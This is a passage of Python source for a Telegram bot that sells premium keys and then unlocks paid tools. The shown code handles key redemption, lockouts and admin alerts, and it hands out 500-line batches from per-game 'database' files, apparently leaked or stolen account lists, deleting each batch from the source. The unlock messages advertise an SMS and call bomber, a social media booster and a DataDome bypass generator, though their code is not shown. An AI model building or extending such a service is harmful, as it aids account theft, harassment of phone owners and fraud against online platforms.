            if current_role == "vip" and new_role == "basic":
                pass  # keep existing vip role
            else:
                USER_ROLES[user_id] = new_role

        async with _DATA_LOCK:
            USER_ACCESS[user_id] = expires_at
            GLOBAL_STATS["total_keys_redeemed"] = GLOBAL_STATS.get("total_keys_redeemed", 0) + 1
            # Audit log
            KEY_REDEMPTION_LOG.append({
                "key": key,
                "user_id": user_id,
                "username": f"@{update.effective_user.username}" if update.effective_user.username else str(user_id),
                "ts": datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),
            })
            USER_STATS.setdefault(user_id, {"generations": 0, "last_active": datetime.datetime.now().isoformat(), "keys_redeemed": 0})
            # Track username for @username lookup in /userinfo
            if update.effective_user and update.effective_user.username:
                USER_STATS[user_id]["username"] = f"@{update.effective_user.username}"
            USER_STATS[user_id]["keys_redeemed"] = USER_STATS[user_id].get("keys_redeemed", 0) + 1
            # Store key duration so /mykey progress bar is accurate (#12)
            USER_STATS[user_id]["key_total_days"] = key_data.get("days", 30)
            if user_id not in USER_STATS:
                USER_STATS[user_id] = {"generations": 0, "last_active": datetime.datetime.now().isoformat()}
            # Increment use count
            ACCESS_KEYS[key]["use_count"] = use_count + 1
            # Only fully consume key if single-use or max reached
            new_use_count = use_count + 1
            if max_uses != 0 and new_use_count >= max_uses:
                del ACCESS_KEYS[key]
                USED_KEYS.add(key)
        schedule_save()

        activated_str = datetime.datetime.now().strftime('%b %d, %Y  %I:%M %p')
        if expires_at:
            expire_date_str = datetime.datetime.fromtimestamp(expires_at).strftime('%b %d, %Y  %I:%M %p')
            expire_line = f"📆 ᴇxᴘɪʀᴇs   : `{expire_date_str}`"
        else:
            expire_line = "📆 ᴇxᴘɪʀᴇs   : ♾️ ɴᴇᴠᴇʀ"
        _final_role = USER_ROLES.get(user_id, "basic")
        _tier_badge = "🟣 VIP" if _final_role in ("vip", "reseller", "mini_admin", "owner") else "🟢 Basic"

        _tools_basic = (
            f"┣ 📂 ᴅᴀᴛᴀʙᴀsᴇ ɢᴇɴᴇʀᴀᴛᴏʀ\n"
            f"┣ 🔐 ᴘʏᴛʜᴏɴ ᴇɴᴄʀʏᴘᴛᴏʀ\n"
            f"┣ 🛡️ ᴅᴀᴛᴀᴅᴏᴍᴇ ɢᴇɴᴇʀᴀᴛᴏʀ\n"
            f"┗ 📥 ᴛᴏᴏʟs ᴅᴏᴡɴʟᴏᴀᴅᴇʀ\n"
        )
        _tools_vip_extra = (
            f"┣ 💣 sᴍs & ᴄᴀʟʟ ʙᴏᴍʙᴇʀ\n"
            f"┗ 🚀 sᴏᴄɪᴀʟ ᴍᴇᴅɪᴀ ʙᴏᴏsᴛᴇʀ\n"
        )

        if _final_role in ("vip", "reseller", "mini_admin", "owner"):
            # Re-terminate basic list with a connector instead of a final ┗
            _unlocked_tools = (
                _tools_basic.rsplit("┗", 1)[0] + "┣" + _tools_basic.rsplit("┗", 1)[1]
            ) + _tools_vip_extra
        else:
            _unlocked_tools = _tools_basic

        success_message = (
            f"╔══════════════════════════╗\n"
            f"║  ✅  ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴛɪᴠᴀᴛᴇᴅ!  ║\n"
            f"╚══════════════════════════╝\n\n"
            f"👤 ᴜsᴇʀ ɪᴅ  : `{user_id}`\n"
            f"🏷️ ᴛɪᴇʀ    : {_tier_badge}\n"
            f"⏳ ᴠᴀʟɪᴅɪᴛʏ : {expiry_text}\n"
            f"{expire_line}\n"
            f"📅 ᴀᴄᴛɪᴠᴀᴛᴇᴅ: `{activated_str}`\n\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🔓 *ᴜɴʟᴏᴄᴋᴇᴅ ᴛᴏᴏʟs*\n"
            f"{_unlocked_tools}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📞 sᴜᴘᴘᴏʀᴛ: @ZyronDevv "
        )
        keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.effective_message.reply_text(success_message, reply_markup=reply_markup, parse_mode="Markdown")
        AWAITING_KEY_INPUT.discard(user_id)
        # Reset brute-force counter on success
        KEY_FAIL_COUNT.pop(user_id, None)
        KEY_FAIL_LOCKOUT.pop(user_id, None)
        # Global stats
        GLOBAL_STATS["total_keys_redeemed"] += 1
        logging.info(f"User {user_id} activated key {key}")
        # ── Admin DM notification ─────────────────────────────────
        uname = USER_STATS.get(user_id, {}).get("username", str(user_id))
        _user = update.effective_user
        _display_raw = (
            f"@{_user.username}" if _user.username
            else f"{_user.first_name or ''} {_user.last_name or ''}".strip()
            or str(user_id)
        )
        _display = escape_md(_display_raw)
        _expire_str = (
            datetime.datetime.fromtimestamp(expires_at).strftime("%b %d, %Y  %I:%M %p")
            if expires_at else "♾️ Lifetime"
        )
        _created_by = key_data.get("created_by", "?")
        _notif = (
            f"\U0001f514 *NEW KEY REDEMPTION*\n"
            f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n"
            f"\U0001f464 User    : {_display}\n"
            f"\U0001f194 ID      : `{user_id}`\n"
            f"\U0001f511 Key     : `{key}`\n"
            f"\u23f3 Duration: {expiry_text.replace('**', '')}\n"
            f"\U0001f4c6 Expires : `{_expire_str}`\n"
            f"\U0001f6e0\ufe0f Created by: `{_created_by}`\n"
            f"\U0001f550 Time    : `{activated_str}`\n"
            f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
        )
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=_notif,
                parse_mode="Markdown"
            )
        except Exception as _e:
            logging.warning(f"Admin redeem notification failed: {_e}")
        # ── Log to channel ────────────────────────────────────────
        await log_to_channel(
            context.bot,
            f"🔑 *Key Redeemed*\n👤 `{user_id}` ({_display})\n⏳ {expiry_text}\n🔑 `{key}`"
        )
        
    elif key in USED_KEYS:
        await update.effective_message.reply_text(
            "╔══════════════════════════╗\n"
            "║  ❌  ᴋᴇʏ ᴀʟʀᴇᴀᴅʏ ᴜsᴇᴅ  ║\n"
            "╚══════════════════════════╝\n\n"
            "ᴛʜɪs ᴋᴇʏ ʜᴀs ʙᴇᴇɴ ᴀᴄᴛɪᴠᴀᴛᴇᴅ ᴀʟʀᴇᴀᴅʏ.\n\n"
            "━━━━━━━━━━━━━━━━━━━━\n"
            "┣ 🔒 sɪɴɢʟᴇ-ᴜsᴇ ᴋᴇʏs ᴄᴀɴɴᴏᴛ ʙᴇ ʀᴇᴜsᴇᴅ\n"
            "┣ 🚫 ɴᴏɴ-ᴛʀᴀɴsғᴇʀᴀʙʟᴇ ᴀғᴛᴇʀ ᴀᴄᴛɪᴠᴀᴛɪᴏɴ\n\n"
            "💡 ɢᴇᴛ ᴀ ɴᴇᴡ ᴋᴇʏ → @ZyronDevv ",
            parse_mode="Markdown"
        )
        AWAITING_KEY_INPUT.discard(user_id)
    else:
        # Track failed attempts
        fails = KEY_FAIL_COUNT.get(user_id, 0) + 1
        KEY_FAIL_COUNT[user_id] = fails
        remaining_attempts = KEY_FAIL_MAX - fails
        if fails >= KEY_FAIL_MAX:
            KEY_FAIL_LOCKOUT[user_id] = time.time() + KEY_FAIL_LOCKOUT_SECS
        # Auto-ban if they hit the threshold (brute-forcing keys)
        if fails >= KEY_AUTO_BAN_THRESHOLD:
            BANNED_USERS.add(user_id)
            schedule_save()
            logging.warning(f"[auto-ban] User {user_id} auto-banned after {fails} failed key attempts")
            try:
                uname = f"@{update.effective_user.username}" if update.effective_user.username else str(user_id)
                await context.bot.send_message(
                    ADMIN_ID,
                    f"🚫 *Auto-Ban Triggered*\n"
                    f"👤 `{user_id}` ({uname})\n"
                    f"Reason: {fails} consecutive failed key attempts.",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            KEY_FAIL_COUNT.pop(user_id, None)
            await update.effective_message.reply_text(
                "🔒  *Too Many Invalid Attempts*\n"
                "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
                "You are locked out for *10 minutes*.\n"
                "Contact @ZyronDevv  if this is a mistake.",
                parse_mode="Markdown"
            )
            # Alert owner
            try:
                uname = USER_STATS.get(user_id, {}).get("username", str(user_id))
                await context.bot.send_message(
                    ADMIN_ID,
                    f"⚠️ *Key Brute-Force Alert*\n👤 `{user_id}` ({uname})\n{KEY_FAIL_MAX} failed attempts — locked out 10 min.",
                    parse_mode="Markdown"
                )
            except Exception:
                pass
            AWAITING_KEY_INPUT.discard(user_id)
            return
        await update.effective_message.reply_text(
            "❌  *Invalid Access Key*\n"
            "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            "The key you entered did not pass verification.\n"
            f"Correct format  ›  `RENZO-XXXX-XXXX`\n"
            "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            f"⚠️  *{remaining_attempts} attempts remaining*\n"
            "Support  ›  @ZyronDevv ",
            parse_mode="Markdown"
        )

async def prompt_for_key(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "🛠️ Bot is under maintenance!", show_alert=True)
            await safe_edit(current_message, 
                "🛠️ *The Bot Is In Maintenance*\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🛠️ *The Bot Is In Maintenance*\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        return

    AWAITING_KEY_INPUT.add(user_id)
    message_text = (
        "— *🔐 ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ* —\n\n"
        "🎯 *ʀᴇǫᴜᴇsᴛɪɴɢ ᴀᴜᴛʜᴇɴᴛɪᴄᴀᴛɪᴏɴ*\n"
        "ᴘʟᴇᴀsᴇ ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴋᴇʏ ʙᴇʟᴏᴡ.\n\n"
        "📋 *ᴋᴇʏ ғᴏʀᴍᴀᴛ ɢᴜɪᴅᴇ*\n"
        "┣ ✦ ᴘᴀᴛᴛᴇʀɴ: `RENZO-XXXX-XXXX`\n"
        "┣ ✦ x = ᴀʟᴘʜᴀɴᴜᴍᴇʀɪᴄ ᴄʜᴀʀᴀᴄᴛᴇʀs\n"
        "┣ ✦ ʟᴇɴɢᴛʜ: 6-ᴄʜᴀʀᴀᴄᴛᴇʀ sᴜғғɪx\n\n"
        "💡 *ᴇxᴀᴍᴘʟᴇ ᴋᴇʏs*\n"
        "`ZYRON-8152-0642`\n"
        "`ZYRON-1973-7532`\n\n"
        "🔓 *ɴᴇᴇᴅ ᴀᴄᴄᴇss?*\n"
        "ᴄᴏɴᴛᴀᴄᴛ @ZyronDevv  ᴛᴏ ᴀᴄǫᴜɪʀᴇ ʏᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏ."
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴘʀᴇᴠɪᴏᴜs", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await safe_edit(current_message, 
            text=message_text,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    else:
        await current_message.reply_text(
            message_text,
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )

# ========== DATABASE GENERATION FUNCTIONS ==========

async def redeem_command(update: Update, context: CallbackContext):
    if await check_cooldown(update): return
    """Handle /redeem command — shortcut to key activation.
    Usage: /redeem  (shows prompt)
           /redeem RENZO-XXXX-XXXX  (redeems directly)
    """
    if context.args:
        # Key passed inline: /redeem RENZO-XXXX-XXXX
        key = " ".join(context.args).strip()
        user_id = update.effective_user.id
        if key in ACCESS_KEYS:
            key_data = ACCESS_KEYS[key]
            if key_data.get("days") == 999999:
                expires_at = None
                expiry_text = "*♾️ ʟɪғᴇᴛɪᴍᴇ*"
            else:
                days = key_data.get("days", 30)
                expires_at = (datetime.datetime.now() + datetime.timedelta(days=days)).timestamp()
                expiry_text = f"*🗓️ {days} day{'s' if days != 1 else ''}*"
            USER_ACCESS[user_id] = expires_at
            if user_id not in USER_STATS:
                USER_STATS[user_id] = {"generations": 0, "last_active": datetime.datetime.now().isoformat()}
            del ACCESS_KEYS[key]
            USED_KEYS.add(key)
            schedule_save()
            activated_str = datetime.datetime.now().strftime('%b %d, %Y  %I:%M %p')
            expire_line = f"📆 ᴇxᴘɪʀᴇs   : {datetime.datetime.fromtimestamp(expires_at).strftime('%b %d, %Y  %I:%M %p')}" if expires_at else "📆 ᴇxᴘɪʀᴇs   : ♾️ ɴᴇᴠᴇʀ"
            await update.effective_message.reply_text(
                f"╔══════════════════════════╗\n"
                f"║  ✅  ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴛɪᴠᴀᴛᴇᴅ!  ║\n"
                f"╚══════════════════════════╝\n\n"
                f"👤 ᴜsᴇʀ ɪᴅ  : `{user_id}`\n"
                f"⏳ ᴠᴀʟɪᴅɪᴛʏ : {expiry_text}\n"
                f"{expire_line}\n"
                f"📅 ᴀᴄᴛɪᴠᴀᴛᴇᴅ: `{activated_str}`\n\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🔓 *ᴜɴʟᴏᴄᴋᴇᴅ ᴛᴏᴏʟs* — ᴜsᴇ /start ᴛᴏ ʙᴇɢɪɴ",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]),
                parse_mode="Markdown"
            )
            logging.info(f"User {user_id} redeemed key {key} via /redeem command")
        elif key in USED_KEYS:
            await update.effective_message.reply_text("❌ *ᴋᴇʏ ᴀʟʀᴇᴀᴅʏ ᴜsᴇᴅ.*\n\nᴄᴏɴᴛᴀᴄᴛ @ZyronDevv  ᴛᴏ ɢᴇᴛ ᴀ ɴᴇᴡ ᴋᴇʏ.", parse_mode="Markdown")
        else:
            await update.effective_message.reply_text("❌ *ɪɴᴠᴀʟɪᴅ ᴋᴇʏ.*\n\nDouble-check your key or contact @ZyronDevv .", parse_mode="Markdown")
    else:
        # No args — show the normal prompt
        await prompt_for_key(update, context)


async def generate_menu(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message

    user_id = update.effective_user.id
    
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "🛠️ Bot is under maintenance!", show_alert=True)
            await safe_edit(current_message, 
                "🛠️  *Maintenance Mode*\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\nThe bot is currently offline.\nBack shortly  ›  @ZyronDevv ",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🛠️  *Maintenance Mode*\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\nThe bot is currently offline.\nBack shortly  ›  @ZyronDevv ",
                parse_mode="Markdown"
            )
        return

    if not has_access(user_id):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "🔒 ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ʀᴇǫᴜɪʀᴇᴅ!", show_alert=True)
            await safe_edit(current_message, 
                "🔒  *Access Required*\n"
                "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
                "You need an active key to generate files.\n"
                "Buy a key  ›  @ZyronDevv ",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🔒  *Access Required*\n"
                "▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
                "You need an active key to generate files.\n"
                "Buy a key  ›  @ZyronDevv ",
                parse_mode="Markdown"
            )
        return

    keyboard = [[InlineKeyboardButton("🗄️ ᴄʜᴏᴏsᴇ ᴀ ᴅᴀᴛᴀʙᴀsᴇs", callback_data="database_menu")],
                [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    user_stats = USER_STATS.get(user_id, {})
    generations = user_stats.get("generations", 0)
    
    menu_text = (
        f"📂  *DB GENERATOR*\n"
        f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
        f"Total generated  ›  `{generations:,}`\n"
        f"💣 SMS Bombs:      `{user_stats.get('sms_bomb_count', 0)}`\n"
        f"🚀 Boost Sessions: `{user_stats.get('boost_count', 0)}`\n"
        f"🔐 Encryptions:    `{user_stats.get('encrypt_count', 0)}`\n"
        f"🔑 Keys Used:      `{user_stats.get('keys_used', 0)}`\n"
        f"▶︎ *ʀᴇᴀᴅʏ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ᴘʀᴇᴍɪᴜᴍ ғɪʟᴇs!*"
    )
    
    if update.callback_query:
        await safe_edit(update.callback_query.message, menu_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await update.effective_message.reply_text(menu_text, reply_markup=reply_markup, parse_mode="Markdown")

async def database_menu(update: Update, context: CallbackContext):
    query = update.callback_query
    try:
        await safe_answer_callback(query)
    except Exception:
        pass

    # Reload DB folder so newly added .txt files appear without restarting
    global DATABASE_FILES
    DATABASE_FILES = _load_database_files()

    current_message: Message = query.message
    
    if MAINTENANCE_MODE and query.from_user.id != ADMIN_ID:
        await safe_edit(current_message, 
            "🛠️ *The Bot Is Maintenance*\n\n"
            "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
            parse_mode="Markdown"
        )
        return

    db_stats, total_lines = get_database_stats()
    
    DB_PAGE_SIZE = 8
    all_dbs = list(DATABASE_FILES.items())
    total_dbs = len(all_dbs)
    page = int(context.user_data.get("db_page", 0))
    total_pages = max(1, (total_dbs + DB_PAGE_SIZE - 1) // DB_PAGE_SIZE)
    page = max(0, min(page, total_pages - 1))
    start_i = page * DB_PAGE_SIZE
    page_dbs = all_dbs[start_i: start_i + DB_PAGE_SIZE]

    keyboard = []
    for db_name, file_path in page_dbs:
        count = db_stats.get(db_name, 0)
        status_icon = "🟢" if count > 1000 else "🟡" if count > 100 else "🔴" if count > 0 else "⚫"
        button_text = f"{status_icon} {db_name} ({count:,})"
        keyboard.append([InlineKeyboardButton(button_text, callback_data=f"generate:{db_name}")])

    # Pagination nav row
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️", callback_data=f"db_page_{page-1}"))
    if total_pages > 1:
        nav.append(InlineKeyboardButton(f"📄 {page+1}/{total_pages}", callback_data="db_page_noop"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton("➡️", callback_data=f"db_page_{page+1}"))
    if nav:
        keyboard.append(nav)

    keyboard.append([InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ᴍᴇɴᴜ", callback_data="show_generate_menu")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    used_today = USER_STATS.get(query.from_user.id, {}).get("generate_today", 0)
    quota      = USER_QUOTAS.get(query.from_user.id, GENERATE_DAILY_LIMIT)
    menu_text = (
        f"📂 *ᴅᴀᴛᴀʙᴀsᴇ sᴇʟᴇᴄᴛɪᴏɴ*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 ᴛᴏᴛᴀʟ ʟɪɴᴇs: `{total_lines:,}` · ᴅʙs: `{total_dbs}`\n"
        f"📦 ᴘᴇʀ ɢᴇɴ: `500` · ᴛᴏᴅᴀʏ: `{used_today}/{quota}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 >1k · 🟡 >100 · 🔴 >0 · ⚫ ᴇᴍᴘᴛʏ\n\n"
        f"ᴘɪᴄᴋ ᴀ ᴅᴀᴛᴀʙᴀsᴇ:"
    )
    
    await safe_edit(current_message, menu_text, reply_markup=reply_markup, parse_mode="Markdown")

async def generate_file(update: Update, context: CallbackContext):
    query = update.callback_query
    try:
        await safe_answer_callback(query)
    except Exception:
        pass

    current_message: Message = query.message

    user_id = query.from_user.id

    try:
        if MAINTENANCE_MODE and user_id != ADMIN_ID:
            await safe_edit(current_message, 
                "🛠️  *Maintenance Mode*\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\nThe bot is currently offline.\nBack shortly  ›  @ZyronDevv ",
                parse_mode="Markdown"
            )
            return

        if not has_access(user_id):
            await safe_edit(current_message,
                "🔒 *ᴀᴄᴄᴇss ʀᴇǫᴜɪʀᴇᴅ*\n\n"
                "ʏᴏᴜ ɴᴇᴇᴅ ᴀɴ ᴀᴄᴄᴇss ᴋᴇʏ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ ғɪʟᴇs.\n\n"
                "• ʙᴜʏ ᴀ ᴋᴇʏ → @ZyronDevv \n"
                "• ᴇᴀʀɴ ᴏɴᴇ → /refer *(+2h ᴘᴇʀ ʀᴇғᴇʀʀᴀʟ)*\n"
                "• ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴏɴᴇ? → ᴛᴀᴘ 🔑 *ᴜsᴇ ᴀᴄᴄᴇss ᴋᴇʏ*",
                parse_mode="Markdown"
            )
            return

        # ── 5-minute generate cooldown check ─────────────────────
        if await check_generate_cooldown(update):
            return
        # ─────────────────────────────────────────────────────────

        # ── Daily generation quota check — VIP+ is unlimited ───
        reset_daily_stats_if_needed(user_id)
        if not is_at_least_role(user_id, "vip"):
            quota      = USER_QUOTAS.get(user_id, GENERATE_DAILY_LIMIT)
            used_today = USER_STATS.get(user_id, {}).get("generate_today", 0)
            if used_today >= quota:
                await safe_edit(current_message,
                    f"📦 *ᴅᴀɪʟʏ ʟɪᴍɪᴛ ʀᴇᴀᴄʜᴇᴅ*\n\n"
                    f"ʏᴏᴜ'ᴠᴇ ᴜsᴇᴅ *{used_today}/{quota}* ɢᴇɴᴇʀᴀᴛɪᴏɴs ᴛᴏᴅᴀʏ.\n"
                    "ʀᴇsᴇᴛs ᴀᴛ ᴍɪᴅɴɪɢʜᴛ.\n\n"
                    "💡 ᴜᴘɢʀᴀᴅᴇ ᴛᴏ *VIP* ғᴏʀ ᴜɴʟɪᴍɪᴛᴇᴅ ɢᴇɴᴇʀᴀᴛɪᴏɴs → @ZyronDevv ",
                    parse_mode="Markdown"
                )
                return
            USER_STATS.setdefault(user_id, {})["generate_today"] = used_today + 1
        # ─────────────────────────────────────────────────────────

        _, game = query.data.split(":")
        file_path = DATABASE_FILES.get(game)

        if not file_path or not os.path.exists(file_path):
            await safe_edit(current_message, 
                f"❌ *Database Error!*\n\nThe database for *{game}* was not found or is unavailable. Please try another selection.",
                parse_mode="Markdown"
            )
            return

        if os.path.getsize(file_path) == 0:
            await safe_edit(current_message, 
                f"📭 *Database Empty!*\n\nThe *{game}* database currently has no lines available. Please select a different database.",
                parse_mode="Markdown"
            )
            return

        loading_steps = [
            "⚡ `[▓░░░░]` ᴀᴄᴄᴇssɪɴɢ ᴅᴀᴛᴀʙᴀsᴇ...",
            "⚡ `[▓▓▓░░]` ᴘʀᴏᴄᴇssɪɴɢ & ғɪʟᴛᴇʀɪɴɢ...",
            "⚡ `[▓▓▓▓░]` ᴀᴘᴘʟʏɪɴɢ ᴘʀᴇᴍɪᴜᴍ ᴇɴʜᴀɴᴄᴇᴍᴇɴᴛs...",
            "✅ `[▓▓▓▓▓]` ʀᴇᴀᴅʏ!"
        ]

        message = await safe_edit(current_message, loading_steps[0], parse_mode="Markdown")
        
        for step in loading_steps[1:]:
            try:
                await asyncio.sleep(0.4)
                await safe_edit(message, step, parse_mode="Markdown")
            except BadRequest:
                pass

        with open(file_path, "r", encoding="utf-8", errors='ignore') as f:
            all_lines = [line.strip() for line in f if line.strip()]

        if not all_lines:
            await safe_edit(current_message, 
                f"📭 *No Data Available!*\n\nThe *{game}* database is currently empty. Please select another.",
                parse_mode="Markdown"
            )
            return

        lines_to_generate = min(500, len(all_lines))
        selected_lines = random.sample(all_lines, lines_to_generate)
        
        selected_set = set(selected_lines)
        remaining_lines = [line for line in all_lines if line not in selected_set]
        
        with open(file_path, "w", encoding="utf-8") as f:
            for line in remaining_lines:
                f.write(line + '\n')

        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        clean_game_name = game.replace('🎮 ', '').replace('🔥 ', '').replace('💫 ', '').replace('🎃 ', '')
        result_filename = f"♨️ᴢʏʀᴏɴ_ᴘʀᴇᴍɪᴜᴍ_{clean_game_name}_{datetime.datetime.now().strftime('%m%d_%H%M')}.txt"
        result_filepath = GENERATED_DIR / result_filename

        with open(result_filepath, "w", encoding="utf-8") as f:
            f.write(f"♨️ {BOT_DISPLAY_NAME} Premium Database ♨️\n")
            f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
            f.write(f"📂 Source: {game}\n")
            f.write(f"📄 Lines: {lines_to_generate}\n")
            f.write(f"🕒 Generated: {timestamp}\n")
            f.write(f"🔥 Quality: Premium Grade\n")
            f.write(f"⚡ Auto-Delete: Enabled (lines removed from source)\n")
            f.write(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")
            
            for i, line in enumerate(selected_lines, 1):
                f.write(f"{line}\n")

        with open(result_filepath, "rb") as f:
            caption = (
                f"✅ *ᴘʀᴇᴍɪᴜᴍ ғɪʟᴇ ʀᴇᴀᴅʏ!*\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🎮 sᴏᴜʀᴄᴇ: `{game}`\n"
                f"📜 ʟɪɴᴇs: *{lines_to_generate:,}*\n"
                f"💾 ʀᴇᴍᴀɪɴɪɴɢ ɪɴ ᴅʙ: *{len(remaining_lines):,}*\n"
                f"🕐 `{timestamp}`\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"⏳ ᴀᴜᴛᴏ-ᴅᴇʟᴇᴛᴇs ɪɴ *3 ᴍɪɴᴜᴛᴇs*\n"
                f"📞 @ZyronDevv "
            )
            
            await context.bot.send_document(
                chat_id=query.message.chat_id,
                document=f,
                filename=result_filename,
                caption=caption,
                parse_mode="Markdown"
            )

        if user_id not in USER_STATS:
            USER_STATS[user_id] = {"generations": 0}
        USER_STATS[user_id]["generations"] += 1
        USER_STATS[user_id]["last_active"] = datetime.datetime.now().isoformat()
        GLOBAL_STATS["total_files_generated"] = GLOBAL_STATS.get("total_files_generated", 0) + 1
        record_tool_use("generate")
        schedule_save()

        asyncio.create_task(delete_generated_file(result_filepath))

        await start(update, context, edit_message_id=query.message.message_id)
        
        logging.info(f"User {user_id} generated {lines_to_generate} lines from {game}. Remaining: {len(remaining_lines)}")

    except Exception as e:
        logging.error(f"Error in generate_file: {e}")
        await safe_edit(current_message, 
            f"❌ *ɢᴇɴᴇʀᴀᴛɪᴏɴ ғᴀɪʟᴇᴅ*\n\nᴀɴ ᴜɴᴇxᴘᴇᴄᴛᴇᴅ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ.",
            parse_mode="Markdown"
        )

# ========== STATISTICS FUNCTIONS ==========
async def show_stats(update: Update, context: CallbackContext):
    if await check_cooldown(update): return
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("show_stats called with no effective message.")
        return

    user_id = update.effective_user.id
    user = update.effective_user
    
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "🛠️ Bot is under maintenance!", show_alert=True)
            await safe_edit(current_message, 
                "🛠️  *Maintenance Mode*\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\nThe bot is currently offline.\nBack shortly  ›  @ZyronDevv ",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🛠️  *Maintenance Mode*\n▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\nThe bot is currently offline.\nBack shortly  ›  @ZyronDevv ",
                parse_mode="Markdown"
            )
        return

    user_stats = USER_STATS.get(user_id, {"generations": 0})
    access_info = USER_ACCESS.get(user_id)
    
    if user_id == ADMIN_ID:
        access_status = "*👑 Administrator*"
        expires_text = "♾️ Permanent"
        access_emoji = "👑"
    elif access_info is None and user_id in USER_ACCESS:
        access_status = "*✞ Lifetime Premium*"
        expires_text = "♾️ Never expires"
